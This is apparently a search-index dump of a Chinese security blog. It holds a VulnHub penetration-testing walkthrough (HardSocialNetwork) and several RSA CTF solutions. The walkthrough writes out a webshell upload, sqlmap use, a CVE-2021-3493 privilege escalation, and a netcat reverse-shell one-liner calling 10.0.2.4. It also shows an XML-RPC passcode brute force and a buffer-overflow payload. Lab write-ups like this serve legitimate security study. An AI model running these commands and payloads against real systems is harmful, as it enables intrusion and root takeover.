ICAgICArICAqICAgICAgKyogICAgICAgICsgICogICAgICAgKyogICAgICAgICsgICoKICAgICAgICsqICAgICAgICArICAqICAgICArKiAgICAgKyAgICAgICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICAgICsqICAgICAgICArICAqICAgICAKICsqICAgICAgICArICAqICAgICAgKyogICAgICsgICAgICAgICsgICogICAgICAgKyogICAgICAgICsgICogICAgICsqICAgICAgICArICAqICAgICArKiAgICAKICAgICsgICogICAgICsqIC4gLiAuICsgICAuICAgICArICAgICAgICArICAqICAgICAgKyogICAgICAgICsgICogICAgICsqICAgICAgICArICAqICAgICAgICsKKiAgICAgICAgKyAgKiAgICAgKyogICAgICAgICsgICogICAgICsqICAgICArICAgICAgICArICAqICAgICAgICsqICAgICAgICArICAqICAgICArKiAgICAgICAKICsgICogICAgICsqICAgICAgICArICAqICAgICArKiAuICsgICAgIC4gICAgICsgICAgICAgICsgICogICAgICArKiAgICAgICAgKyAgKiAgICAgKyogICAgICAKICArICAqICAgICAgICsqICAgICAgICArICAqICAgICArKiAgICAgICAgKyAgKiAgICAgICArKiArICAgICAuICAgICArICAgICAgICArICAqICAgICAgKyogICAKICAgICArICAqICAgICArKiAgICAgICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICAgICsqICAgICAgICArICAqICAgICAgICsqICAgICArICAgICAgICAKKyAgKiAgICAgICsqICAgICAgICArICAqICAgICArKiAgICAgICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICAgICsqICAgICAgICArICAqICAgICAgKyoKICAgICArICAgICAgICArICAqICAgICAgKyogICAgICAgICsgICogICAgICAgKyogICAgICAgICsgICogICAgICAgKyogICAgICAgICsgICogICAgICArKiAgICAKICsgICAgICAgICsgICogICAgICArKiAgICAgICAgKyAgKiAgICAgICArKiAgICAgICAgKyAgKiAgICAgKyogICAgICAgICsgICogICAgICsqICAgICArICAgICAKICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICAgICsqICAgICAgICArICAqICAgICAgKyogICAgICAgICsgICogICAgICArKiAgICAgICAuICAgICAgIC4KICAgICAgIC4gICAgICAgLiArIC4gICAgICsgICAgICAgICsgICogICAgICArKiAgICAgICAgKyAgKiAgICAgICArKiAgICAgICAgKyAgKiAgICAgKyogICAgICAKICArICAqICAgICArKiAgICAgKyAgICAgICAgKyAgKiAgICAgICsqICAgICAgICArICAqICAgICArKiAgICAgICAgKyAgKiAgICAgICArKiAgICAgICAgKyAgKiAKICAgICsqICAgICAgICArICAqICAgICAgICsqIC4gKyAgIC4gICAgICsgICAgICAgICsgICogICAgICArKiAgICAgICAgKyAgKiAgICAgKyogICAgICAgICsgICoKICAgICAgKyogICAgICAgICsgICogICAgICAgKyogICAgICAgICsgICogICAgICAgKyogKyAgICAgLiAgICAgKyAgICAgICAgKyAgKiAgICAgICsqICAgICAgICAKKyAgKiAgICAgKyogICAgICAgICsgICogICAgICAgKyogICAgICAgICsgICogICAgICsqICAgICAgICArICAqICAgICAgKyogICAgICsgICAgICAgICsgICogICAKICAgKyogICAgICAgICsgICogICAgICAgKyogICAgICAgICsgICogICAgICArKiAgICAgICAgKyAgKiAgICAgKyogICAuICsgICAuICAgICArKiArIC4gICAgICsKICAgICAgICArICAqICAgICAgICsqICAgICAgICArICAqICAgICArKiAgICAgICAgKyAgKiAgICAgKyogICAgICAgICsgICogICAgICArKiAqICsgICAgICAgLiAKICAgICsgICAgICAgICsgICogICAgICAgKyogICAgICAgICs","date":"2021-11-06","objectID":"/2021-11-06-dasctf-oct-writeup/:14:0","tags":["CTF","Misc"],"title":"DASCTF Oct WriteUp","uri":"/2021-11-06-dasctf-oct-writeup/"},{"categories":["安全技术"],"content":"\r","date":"2021-10-24","objectID":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/:0:0","tags":["渗透测试","Web安全"],"title":"打靶-HardSocialNetwork","uri":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/"},{"categories":["安全技术"],"content":"0x00 准备工作 靶机地址: https://download.vulnhub.com/boredhackerblog/hard_socnet2.ova 难度等级: 高 打靶目标: 取得 root 权限 涉及攻击方法: 主机发现 端口扫描 SQL注入 文件上传 CVE-2021-3493 XMLRPC 逆向工程 动态调试 缓冲区溢出 漏洞利用代码编写 ","date":"2021-10-24","objectID":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/:1:0","tags":["渗透测试","Web安全"],"title":"打靶-HardSocialNetwork","uri":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/"},{"categories":["安全技术"],"content":"0x01 信息搜集 对靶机端口进行扫描。 访问8000端口时会发现501报错，提示不支持GET请求，用拓展修改请求方式，依旧报错。 看看80端口，发现登录需要用邮件的格式。 简单注册一个用户。 在后台能发现一个疑似管理员的账户，他描述说在系统上运行了有monitor.py。 ","date":"2021-10-24","objectID":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/:2:0","tags":["渗透测试","Web安全"],"title":"打靶-HardSocialNetwork","uri":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/"},{"categories":["安全技术"],"content":"0x02 GetShell 发现这个地方可以传文件，试下php一句话木马。 直接传上去了，没有任何过滤，那就上蚁剑连接！成功拿到了www-data的权限。 翻一下目录，database文件夹很可疑，进去后看到两个sql文件，当前用户运行不了mysql。 把这两个文件下载到本地分析，发现了数据库的部分信息，但没什么用。 结合 怀疑存在sql注入，测试后成功验证，上sqlmap一把梭。 bp抓包后，另存为文件r 运行sqlmap -r r -p id,接着往下爆破得到管理员的账号密码。 但登录admin未发现有价值的信息，这时查看系统内核版本和操作系统版本。 ","date":"2021-10-24","objectID":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/:3:0","tags":["渗透测试","Web安全"],"title":"打靶-HardSocialNetwork","uri":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/"},{"categories":["安全技术"],"content":"0x03 提升权限 在github上找到CVE-2021-3493的exphttps://github.com/briskets/CVE-2021-3493,上传后运行。 发现提权是成功的，但因为蚁剑的原因自动退出了，这时试着用nc尝试，但nc上不支持-e参数。一种新的反弹shell方式rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2\u003e\u00261|nc 10.0.2.4 3333 \u003e/tmp/f 再通过python -c \"import pty; pty.spawn('/bin/bash')\"实现交互式命令行。 再运行exploit文件，提权成功。 ","date":"2021-10-24","objectID":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/:4:0","tags":["渗透测试","Web安全"],"title":"打靶-HardSocialNetwork","uri":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/"},{"categories":["安全技术"],"content":"0x04 另一种提权方法 继续搜集信息，查看到socnet的可疑用户，跳到他的目录下，发现存在monitor.py文件。 查看下进程 查看源代码如下： #my remote server management API import SimpleXMLRPCServer import subprocess import random debugging_pass = random.randint(1000,9999) def runcmd(cmd): results = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE) output = results.stdout.read() + results.stderr.read() return output def cpu(): return runcmd(\"cat /proc/cpuinfo\") def mem(): return runcmd(\"free -m\") def disk(): return runcmd(\"df -h\") def net(): return runcmd(\"ip a\") def secure_cmd(cmd,passcode): if passcode==debugging_pass: return runcmd(cmd) else: return \"Wrong passcode.\" server = SimpleXMLRPCServer.SimpleXMLRPCServer((\"0.0.0.0\", 8000)) server.register_function(cpu) server.register_function(mem) server.register_function(disk) server.register_function(net) server.register_function(secure_cmd) server.serve_forever() XMLRPCServer的官方说明在https://docs.python.org/zh-cn/3/library/xmlrpc.html，可以知道服务端是需要通过XMLRPC的方式来请求。这里在本地构造客户端，用cpu函数进行测试。 能够成功执行。 进一步修改代码，爆破passcode。 修改命令，反弹shell。 成功拿到权限。 查看当前目录下的文件，发现有文件存在root权限，然后文件类型为elf。 运行文件，依次输入字符串，运行结束后产生新文件，查看内容。共有姓名、工作年限、工资、是否遇到困难、抱怨5处入口点。 靶机存在peda，而它是gdb的插件，运行gdb -q ./add_record来加载add_record。输入r运行程序。 用python3 -c \"print('A'*500)\"生成一系列的A，测试是否存在缓冲区溢出，发现Explain有问题。 EIP存放的是下一条要执行的指令地址，所以要计算出第几个字符被填充到EIP。使用pattern create 100命令生成100个特征字符串。 输入后使用pattern search找到字符串的位置，可以发现63的位置就是EIP，只要将EIP的下一条地址指向shell命令所在的内存地址，就能提权成功。 使用disas main命令，查看main函数的汇编代码，发现了vuln的可疑函数。 使用info func，查看当前程序使用的函数，发现了异常的函数。 disas vuln查看具体执行了哪些指令，其中strcpy函数可能会产生缓冲区溢出。 disas backdoor查看具体执行了哪些指令，函数调用了setuid和system函数，尝试执行操作系统的指令。或许可以通过执行backdoor函数达到提权的目的。 按q退出后，通过python脚本把起始地址0x08048676，写进EIP寄存器。 python -c \"import struct;print('1\\n1\\n1\\n1\\n' + 'A' * 62 + struct.pack('I', 0x08048676))\" \u003e payload\r最后执行cat payload - | ./add_record，成功提升权限！ ","date":"2021-10-24","objectID":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/:5:0","tags":["渗透测试","Web安全"],"title":"打靶-HardSocialNetwork","uri":"/2021-10-25-%E6%89%93%E9%9D%B6-hardsocialnetwork/"},{"categories":["WriteUp"],"content":"\r","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:0:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x00 RSA \u0026 what Readme.txt内容如下： 素数生成算法太麻烦了，有没有取巧的方法呢？\r诶，这里好像有个不错的想法哟。\r看起来节约了不少时间呢，嘿嘿嘿……\r顺便问问，应该大家都知道base64吧，用来编码还是很方便的呢！\rrsa.py如下 from Crypto.Util.number import bytes_to_long, getPrime\rfrom random import randint\rfrom gmpy2 import powmod\rp = getPrime(2048)\rq = getPrime(2048)\rN = p*q\rPhi = (p-1)*(q-1)\rdef get_enc_key(N,Phi):\re = getPrime(N)\rif Phi % e == 0:\rreturn get_enc_key(N, Phi)\relse:\rreturn e\re1 = get_enc_key(randint(10, 12), Phi)\re2 = get_enc_key(randint(10, 12), Phi)\rfr = open(r\"./base64\", \"rb\")#flag is in this file\rf1 = open(r\"./HUB1\", \"wb\")\rf2 = open(r\"./HUB2\", \"wb\")\rbase64 = fr.read(255)\rf1.write(\"%d\\n%d\\n\" % (N, e1))\rf2.write(\"%d\\n%d\\n\" % (N, e2))\rwhile len(base64)\u003e0:\rpt = bytes_to_long(base64)\rct1 = powmod(pt, e1, N)\rct2 = powmod(pt, e2, N)\rf1.write(\"\\n%d\" % ct1)\rf2.write(\"\\n%d\" % ct2)\rbase64 = fr.read(255)\rfr.close()\rf1.close()\rf2.close()\r可以看到，HUB1中写入的是 N，e1，密文base64_1e1mod N的循环结果，HUB2类似。这里根据同一N，c1，c2，e1，e2很容易联想到共模攻击，这里写个脚本解一下。 def deal(c1 , c2 , e1 , e2 , n):\rs = gmpy2.gcdext(e1,e2) #扩展欧几里得算法\rs1 = s[1]\rs2 = s[2]\r# 求模反元素\rif s1 \u003c 0:\rs1 = -s1\rc1 = gmpy2.invert(c1, n)\relif s2 \u003c 0:\rs2 = -s2\rc2 = gmpy2.invert(c2, n)\rm = pow(c1, s1, n) * pow(c2, s2, n) % n\rreturn m\rb = bytes()\rfor i in range(len(base64_1)):\rm = deal(base64_1[i],base64_2[i],e1,e2,n)\rb += long_to_bytes(m)\rprint (b)\r得到一串base64的字符 VEhJUz==\\nRkxBR3==\\nSVN=\\nSElEREVOLo==\\nQ0FO\\nWU9V\\nRklORM==\\nSVT=\\nT1VUP4==\\nRE8=\\nWU9V\\nS05PV9==\\nQkFTRTY0P5==\\nWW91bmdD\\nVEhJTku=\\nWU9V\\nQVJF\\nTk9U\\nVEhBVE==\\nRkFNSUxJQVI=\\nV0lUSO==\\nQkFTRTY0Lh==\\nQmFzZTY0\\naXO=\\nYW==\\nZ3JvdXA=\\nb2b=\\nc2ltaWxhcn==\\nYmluYXJ5LXRvLXRleHR=\\nZW5jb2Rpbme=\\nc2NoZW1lc0==\\ndGhhdD==\\ncmVwcmVzZW50\\nYmluYXJ5\\nZGF0YW==\\naW5=\\nYW6=\\nQVNDSUl=\\nc3RyaW5n\\nZm9ybWF0\\nYnk=\\ndHJhbnNsYXRpbmd=\\naXS=\\naW50b1==\\nYT==\\ncmFkaXgtNjQ=\\ncmVwcmVzZW50YXRpb24u\\nVGhl\\ndGVybc==\\nQmFzZTY0\\nb3JpZ2luYXRlc8==\\nZnJvbd==\\nYY==\\nc3BlY2lmaWN=\\nTUlNRT==\\nY29udGVudI==\\ndHJhbnNmZXI=\\nZW5jb2Rpbmcu\\nVGhl\\ncGFydGljdWxhct==\\nc2V0\\nb2b=\\nNjR=\\nY2hhcmFjdGVyc5==\\nY2hvc2Vu\\ndG+=\\ncmVwcmVzZW50\\ndGhl\\nNjQ=\\ncGxhY2UtdmFsdWVz\\nZm9y\\ndGhl\\nYmFzZd==\\ndmFyaWVz\\nYmV0d2Vlbt==\\naW1wbGVtZW50YXRpb25zLp==\\nVGhl\\nZ2VuZXJhbI==\\nc3RyYXRlZ3n=\\naXO=\\ndG9=\\nY2hvb3Nl\\nNjR=\\nY2hhcmFjdGVyc5==\\ndGhhdA==\\nYXJl\\nYm90aN==\\nbWVtYmVyc5==\\nb2a=\\nYS==\\nc3Vic2V0\\nY29tbW9u\\ndG8=\\nbW9zdM==\\nZW5jb2RpbmdzLA==\\nYW5k\\nYWxzb8==\\ncHJpbnRhYmxlLg==\\nVGhpc9==\\nY29tYmluYXRpb25=\\nbGVhdmVz\\ndGhl\\nZGF0YW==\\ndW5saWtlbHk=\\ndG/=\\nYmV=\\nbW9kaWZpZWS=\\naW5=\\ndHJhbnNpdE==\\ndGhyb3VnaN==\\naW5mb3JtYXRpb26=\\nc3lzdGVtcyw=\\nc3VjaN==\\nYXM=\\nRS1tYWlsLD==\\ndGhhdA==\\nd2VyZQ==\\ndHJhZGl0aW9uYWxseQ==\\nbm90\\nOC1iaXQ=\\nY2xlYW4uWzFd\\nRm9y\\nZXhhbXBsZSw=\\nTUlNRSdz\\nQmFzZTY0\\naW1wbGVtZW50YXRpb24=\\ndXNlcw==\\nQahDWiw=\\nYahDeiw=\\nYW5k\\nMKhDOQ==\\nZm9y\\ndGhl\\nZmlyc3Q=\\nNjI=\\ndmFsdWVzLg==\\nT3RoZXI=\\ndmFyaWF0aW9ucw==\\nc2hhcmU=\\ndGhpcw==\\ncHJvcGVydHk=\\nYnV0\\nZGlmZmVy\\naW4=\\ndGhl\\nc3ltYm9scw==\\nY2hvc2Vu\\nZm9y\\ndGhl\\nbGFzdA==\\ndHdv\\ndmFsdWVzOw==\\nYW4=\\nZXhhbXBsZQ==\\naXM=\\nVVRGLTcu 再base64解码一下 M = bytes()\rtemp = bytes()\rfor j in b:\rs = long_to_bytes(j)\rif s == b'\\n':\rM += base64.b64decode(temp)\rM += b' '\rtemp = bytes()\rcontinue\rtemp += s\rprint (M)\r得到如下结果 THIS FLAG IS HIDDEN. CAN YOU FIND IT OUT? DO YOU KNOW BASE64? YoungC THINK YOU ARE NOT THAT FAMILIAR WITH BASE64. Base64 is a group of similar binary-to-text encoding schemes that represent binary data in an ASCII string format by translating it into a radix-64 representation. The term Base64 originates from a specific MIME content transfer encoding. The particular set of 64 characters chosen to represent the 64 place-values for the base varies between implementations. The general strategy is to choose 64 characters that are both members of a subset common to most encodings, and also printable. This combination leaves the data unlikely to be modified in transit through information systems, such as E-mail, that were traditionally not 8-bit clean.[1] For example, MIME's Base64 implementation uses A\\xa8CZ, a\\xa8Cz, and 0\\xa8C9 for the first 62 values. Other variations share this pro","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:1:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x01 [RoarCTF2019]RSA 其实分解n得到p，q，然后直接爆破e就ok了，但这道题的考点并不在此，属于非预期解了。 首先，根据公式A=(((y%x)**5)%(x%y))**2019+y**316+(y+1)/x，给x,y框定一个取值范围，然后爆破。 爆破出x:2 y:83 for x in range(2,100):\rfor y in range(2,100):\rtry:\rif x%y != 0:\rres = (((y%x)**5)%(x%y))**2019+y**316+(y+1)//x if res == A:\rprint (\"x:%d y:%d\"%(x,y))\rexcept:\rpass\rn与z、z*166的大小比较相近且n比z、z*166大，那么对n/166进行开方，得数应与q接近且比q小。解出P:842868045681390934539739959201847552284980179958879667933078453950968566151662147267006293571765463137270594151138695778986165111380428806545593588078365331313084230014618714412959584843421586674162688321942889369912392031882620994944241987153078156389470370195514285850736541078623854327959382156753458569 Q:139916095583110895133596833227506693679306709873174024876891023355860781981175916446323044732913066880786918629089023499311703408489151181886568535621008644997971982182426706592551291084007983387911006261442519635405457077292515085160744169867410973960652081452455371451222265819051559818441257438021073941183 然后再爆破e即可。 n1 = n//166\rnp = (gmpy2.iroot(n1,2))[0]\rp = sympy.nextprime(np)\rq = n//p\rprint (\"P:%d Q:%d\"%(p,q))\r","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:2:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x02 [RoarCTF2019]babyRSA import sympy import random def myGetPrime(): A= getPrime(513) print(A) B=A-random.randint(1e3,1e5) print(B) return sympy.nextPrime((B!)%A) p=myGetPrime() #A1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467234407 #B1=21856963452461630437348278434191434000066076750419027493852463513469865262064340836613831066602300959772632397773487317560339056658299954464169264467140596 q=myGetPrime() #A2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858418927 #B2=16466113115839228119767887899308820025749260933863446888224167169857612178664139545726340867406790754560227516013796269941438076818194617030304851858351026 r=myGetPrime() n=p*q*r #n=85492663786275292159831603391083876175149354309327673008716627650718160585639723100793347534649628330416631255660901307533909900431413447524262332232659153047067908693481947121069070451562822417357656432171870951184673132554213690123308042697361969986360375060954702920656364144154145812838558365334172935931441424096270206140691814662318562696925767991937369782627908408239087358033165410020690152067715711112732252038588432896758405898709010342467882264362733 c=pow(flag,e,n) #e=0x1001 #c=75700883021669577739329316795450706204502635802310731477156998834710820770245219468703245302009998932067080383977560299708060476222089630209972629755965140317526034680452483360917378812244365884527186056341888615564335560765053550155758362271622330017433403027261127561225585912484777829588501213961110690451987625502701331485141639684356427316905122995759825241133872734362716041819819948645662803292418802204430874521342108413623635150475963121220095236776428 #so,what is the flag? 这里要运算阶乘来求出p、q，阶乘取模的话涉及到威尔逊定理: (A-1)!+1≡0 (mod A)，所以B!(B+1)(B+2)…(A-1) ≡ -1 (mod A)，只要求出(B+1)(B+2)…(A-1)在模数A下的逆，就可直接求出B!(mod A)。参考https://blog.csdn.net/weixin_44110537/article/details/107274845 def mydecrypt(A,B):\rans=1\rtemp=gmpy2.powmod(-1,1,A)\r#print(temp)\rfor i in range(B+1,A):\rans=(ans*gmpy2.invert(i,A))%A\rreturn (ans*temp)%A\r解flag部分的代码如下： p = sympy.nextprime(mydecrypt(A1,B1))\rq = sympy.nextprime(mydecrypt(A2,B2))\rr = n//p//q\rphi = (p-1)*(q-1)*(r-1)\rd = gmpy2.invert(e,phi)\rflag = gmpy2.powmod(c,d,n)\rprint(binascii.unhexlify(hex(flag)[2:]))\r","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:3:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x03 [GWCTF 2019]BabyRSA secret文件里面存放了N、m1、m2。encrypto.py的内容如下： import hashlib\rimport sympy\rfrom Crypto.Util.number import *\rflag = 'GWHT{******}'\rsecret = '******'\rassert(len(flag) == 38)\rhalf = len(flag) / 2\rflag1 = flag[:half]\rflag2 = flag[half:]\rsecret_num = getPrime(1024) * bytes_to_long(secret)\rp = sympy.nextprime(secret_num)\rq = sympy.nextprime(p)\rN = p * q\re = 0x10001\rF1 = bytes_to_long(flag1)\rF2 = bytes_to_long(flag2)\rc1 = F1 + F2\rc2 = pow(F1, 3) + pow(F2, 3)\rassert(c2 \u003c N)\rm1 = pow(c1, e, N)\rm2 = pow(c2, e, N)\routput = open('secret', 'w')\routput.write('N=' + str(N) + '\\n')\routput.write('m1=' + str(m1) + '\\n')\routput.write('m2=' + str(m2) + '\\n')\routput.close()\r由于p和q是相邻的素数，可以将N开平方根求解。 np = (gmpy2.iroot(N,2))[0]\rp = sympy.nextprime(np)\rq = N//p\r然后解出c1和c2。 phi = (p-1)*(q-1)\rd = gmpy2.invert(e,phi)\rc1 = pow(m1,d,N)\rc2 = pow(m2,d,N)\r再需要构造二次方程求解F1、F2： c1 = F1 + F2\rc2 = F1\u003csup\u003e3\u003c/sup\u003e + F2\u003csup\u003e3\u003c/sup\u003e\rc1\u003csup\u003e3\u003c/sup\u003e-c2=3F1F2c1\r3c1F2²-3c1²F2+c1³-c2=0\r求解代码如下： a = 3*c1\rb = -3*pow(c1,2)\rc = pow(c1,3)-c2\rdelta = gmpy2.iroot(pow(b,2)-4*a*c,2)[0]\rF2 = (-b+delta)//(2*a)\rF1 = c1-F2\r最后print(binascii.unhexlify(hex(F2)[2:])+binascii.unhexlify(hex(F1)[2:]))输出flag。 ","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:4:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x04 [ACTF新生赛2020]crypto-rsa0 首先解下压缩包的伪加密，p、q、e、enc都有，直接解。 ","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:5:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x05 [ACTF新生赛2020]crypto-rsa3 p和q是相邻的素数，n开平方根求解 ，e、c都有，直接解。 ","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:6:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x06 [MRCTF2020]babyRSA import sympy import random from gmpy2 import gcd, invert from Crypto.Util.number import getPrime, isPrime, getRandomNBitInteger, bytes_to_long, long_to_bytes from z3 import * flag = b\"MRCTF{xxxx}\" base = 65537 def GCD(A): B = 1 for i in range(1, len(A)): B = gcd(A[i-1], A[i]) return B def gen_p(): P = [0 for i in range(17)] P[0] = getPrime(128) for i in range(1, 17): P[i] = sympy.nextprime(P[i-1]) print(\"P_p :\", P[9]) n = 1 for i in range(17): n *= P[i] p = getPrime(1024) factor = pow(p, base, n) print(\"P_factor :\", factor) return sympy.nextprime(p) def gen_q(): sub_Q = getPrime(1024) Q_1 = getPrime(1024) Q_2 = getPrime(1024) Q = sub_Q ** Q_2 % Q_1 print(\"Q_1: \", Q_1) print(\"Q_2: \", Q_2) print(\"sub_Q: \", sub_Q) return sympy.nextprime(Q) if __name__ == \"__main__\": _E = base _P = gen_p() _Q = gen_q() assert (gcd(_E, (_P - 1) * (_Q - 1)) == 1) _M = bytes_to_long(flag) _C = pow(_M, _E, _P * _Q) print(\"Ciphertext = \", _C) ''' P_p : 206027926847308612719677572554991143421 P_factor : 213671742765908980787116579976289600595864704574134469173111790965233629909513884704158446946409910475727584342641848597858942209151114627306286393390259700239698869487469080881267182803062488043469138252786381822646126962323295676431679988602406971858136496624861228526070581338082202663895710929460596143281673761666804565161435963957655012011051936180536581488499059517946308650135300428672486819645279969693519039407892941672784362868653243632727928279698588177694171797254644864554162848696210763681197279758130811723700154618280764123396312330032986093579531909363210692564988076206283296967165522152288770019720928264542910922693728918198338839 Q_1: 103766439849465588084625049495793857634556517064563488433148224524638105971161051763127718438062862548184814747601299494052813662851459740127499557785398714481909461631996020048315790167967699932967974484481209879664173009585231469785141628982021847883945871201430155071257803163523612863113967495969578605521 Q_2: 151010734276916939790591461278981486442548035032350797306496105136358723586953123484087860176438629843688462671681777513652947555325607414858514566053513243083627810686084890261120641161987614435114887565491866120507844566210561620503961205851409386041194326728437073995372322433035153519757017396063066469743 sub_Q: 168992529793593315757895995101430241994953638330919314800130536809801824971112039572562389449584350643924391984800978193707795909956472992631004290479273525116959461856227262232600089176950810729475058260332177626961286009876630340945093629959302803189668904123890991069113826241497783666995751391361028949651 Ciphertext = 1709187240516367141460862187749451047644094885791761673574674330840842792189795049968394122216854491757922647656430908587059997070488674220330847871811836724541907666983042376216411561826640060734307013458794925025684062804589439843027290282034999617915124231838524593607080377300985152179828199569474241678651559771763395596697140206072537688129790126472053987391538280007082203006348029125729650207661362371936196789562658458778312533505938858959644541233578654340925901963957980047639114170033936570060250438906130591377904182111622236567507022711176457301476543461600524993045300728432815672077399879668276471832 ''' 信息很足，先算一下_P吧，首先我们知道了P[9]的值，接着就可以用nextprime和prevprime来求出其他的P值，然后算出n，再通过e和factor算出p，最后就能得到_P。 P = [0 for i in range(17)] P[9] = 206027926847308612719677572554991143421 for i in range(10, 17): P[i] = sympy.nextprime(P[i-1]) for i in range(1,10): P[9-i] = sympy.prevprime(P[10-i]) n = 1 phi = 1 for i in range(17): n *= P[i] phi *= P[i]-1 d = gmpy2.invert(e,phi) p = pow(factor, d, n) _P = sympy.nextprime(p) print (_P) #160735380264118564161835536782782924160005620631679929855445290207351945863258282088265202232862202180668844947205806261323713945818872852303248590355632665886900928520533421774721590935485773234619558181513033385642711706205607543347313747616062185115981201425568780146693758544521883683953378438266703113683 _Q求解很简单了 Q = gmpy2.powmo","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:7:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x07 [NCTF2019]babyRSA from Crypto.Util.number import * from flag import flag def nextPrime(n): n += 2 if n \u0026 1 else 1 while not isPrime(n): n += 2 return n p = getPrime(1024) q = nextPrime(p) n = p * q e = 0x10001 d = inverse(e, (p-1) * (q-1)) c = pow(bytes_to_long(flag.encode()), e, n) # d = 19275778946037899718035455438175509175723911466127462154506916564101519923603308900331427601983476886255849200332374081996442976307058597390881168155862238533018621944733299208108185814179466844504468163200369996564265921022888670062554504758512453217434777820468049494313818291727050400752551716550403647148197148884408264686846693842118387217753516963449753809860354047619256787869400297858568139700396567519469825398575103885487624463424429913017729585620877168171603444111464692841379661112075123399343270610272287865200880398193573260848268633461983435015031227070217852728240847398084414687146397303110709214913 # c = 5382723168073828110696168558294206681757991149022777821127563301413483223874527233300721180839298617076705685041174247415826157096583055069337393987892262764211225227035880754417457056723909135525244957935906902665679777101130111392780237502928656225705262431431953003520093932924375902111280077255205118217436744112064069429678632923259898627997145803892753989255615273140300021040654505901442787810653626524305706316663169341797205752938755590056568986738227803487467274114398257187962140796551136220532809687606867385639367743705527511680719955380746377631156468689844150878381460560990755652899449340045313521804 先根据d、e反推出phi，phi = d*e-1，求得值为1263276724786485833820889643051708344849417985755595487219919790861521311233190055401020770751191124694549589042182800211800883338235699297206179117430743526738441426391986230201786173703879718588289330011662648464832295666077054769889634578358630646511023034020014559708844709384915702114119981847563803823151396546437464442781871774330912743089912241233606515436818023218823232106596887320756980171544889845523493947146416583343202444459446863209442943852835426970462374916733061574745498850302067362222759925985414929821670098656412210796212981431198008380580101528500867414250720415928258285351513440053966549817753280 然后参考https://blog.csdn.net/weixin_45859850/article/details/111401650，e*d %[(p-1)*(q-1)]= 1 则phi = k* (p-1)*(q-1)，可以通过爆破k的值来得到(p-1)*(q-1)，由于e*d-1是2063到2064位 、(p-1)*(q-1)是1024+1024=2048位，则k的取值范围为215~216 for i in range(1000,3000):\rif e*d-1 \u003e 2**i and e*d-1\u003c2**(i+1):\rprint(i)\rbreak\r#2063\rq是p的下一个素数。 for k in range(pow(2,15),pow(2,16)):\rif phi %k == 0:\rp = sympy.prevprime(gmpy2.iroot(phi//k,2)[0])\rq = sympy.nextprime(p)\rif phi//k == (p-1)*(q-1):\rbreak\r","date":"2021-10-15","objectID":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/:8:0","tags":["CTF","密码学"],"title":"RSA练习▪补","uri":"/2021-10-15-rsa%E7%BB%83%E4%B9%A0%E8%A1%A5/"},{"categories":["WriteUp"],"content":"0x08 [AFCTF2018]可怜的RSA 常规解密。 import gmpy2\rimport base64\rfrom Crypto.PublicKey import RSA\rfrom Crypto.Cipher import PKCS1_OAEP\rf = open('flag.enc', 'r').read()\rc = base64.b64decode(f)\rrsa_com = (n,e,int(d),p,q)\rrsa = RSA.construct(rsa_com)\rkey = RSA.importKey(rsa.exportKey())\rkey = PKCS1_OAEP.new(key)\rflag = 